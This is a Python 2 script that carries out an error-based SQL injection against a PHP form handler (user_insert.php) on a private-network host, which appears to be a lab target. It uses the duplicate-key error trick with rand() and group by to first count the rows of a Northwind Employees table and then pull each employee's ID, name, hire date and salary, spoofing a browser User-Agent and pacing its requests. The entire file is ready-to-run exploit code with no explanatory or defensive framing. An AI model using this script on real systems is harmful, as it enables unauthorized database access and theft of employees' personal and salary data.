import httplib
import urllib
import time

delims = "!~!~!"
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

domain = "192.168.126.128"
url = "/user_insert.php"

table_name = "northwind.Employees"
column_name = "concat(EmployeeID,0x2C20,FirstName,0x2C20,date(HireDate),0x2C20,floor(Salary))"

params = "id=test\',(select x from(select count(*),concat('" + delims + "',(select count(*) from " + table_name + "), '" + delims + "',floor(rand(0)*2))x from information_schema.tables group by x)T))#&name=test"

conn = httplib.HTTPConnection(domain,"80")
#conn = httplib.HTTPSConnection(domain,"443")
conn.request("POST",url,params,headers)
response = conn.getresponse().read()

count = int(response.split(delims)[1])

for i in range(0,count):
	params = "id=test\',(select x from(select count(*),concat('" + delims + "',(select " + column_name + " from " + table_name + " limit 1 offset " + str(i) + "), '" + delims + "',floor(rand(0)*2))x from information_schema.tables group by x)T))#&name=test"

	conn = httplib.HTTPConnection(domain,"80")
	#conn = httplib.HTTPSConnection(domain,"443")
	conn.request("POST",url,params,headers)
	response = conn.getresponse().read()
	
	print str(i) + " : " + response.split(delims)[1]
	time.sleep(100.0 / 1000.0) 
